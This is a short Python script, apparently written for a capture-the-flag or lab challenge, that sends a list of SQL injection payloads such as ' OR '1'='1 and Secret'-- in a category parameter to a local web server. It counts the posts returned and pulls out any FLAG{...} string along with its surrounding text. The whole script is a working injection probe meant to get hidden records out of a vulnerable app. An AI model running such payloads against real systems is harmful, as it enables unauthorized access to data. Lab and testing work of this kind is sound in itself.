import requests
import re
from urllib.parse import quote

BASE_URL = "http://127.0.0.1:32860/"

payloads = [
    ("Technology", "Baseline"),
    ("'", "Quote"),
    ("' OR '1'='1", "OR-1"),
    ("' OR 1=1--", "OR-2"),
    ("Secret' OR '1'='1", "Secret-OR"),
    ("Secret'--", "Secret-comment"),
]

for payload, name in payloads:
    url = f"{BASE_URL}?category={quote(payload)}"
    try:
        r = requests.get(url, timeout=5)
        posts = r.text.count('<article')
        flags = re.findall(r'FLAG\{[^}]+\}', r.text)
        
        result = f"{name}: {r.status_code} | Posts:{posts}"
        if flags:
            result += f" | FLAG:{flags[0]}"
        print(result)
        
        # If flag found, print relevant section
        if flags:
            idx = r.text.find('FLAG{')
            if idx != -1:
                print(f"Context: {r.text[max(0,idx-100):idx+150]}")
    except Exception as e:
        print(f"{name}: ERROR - {e}")

print("\nDone")

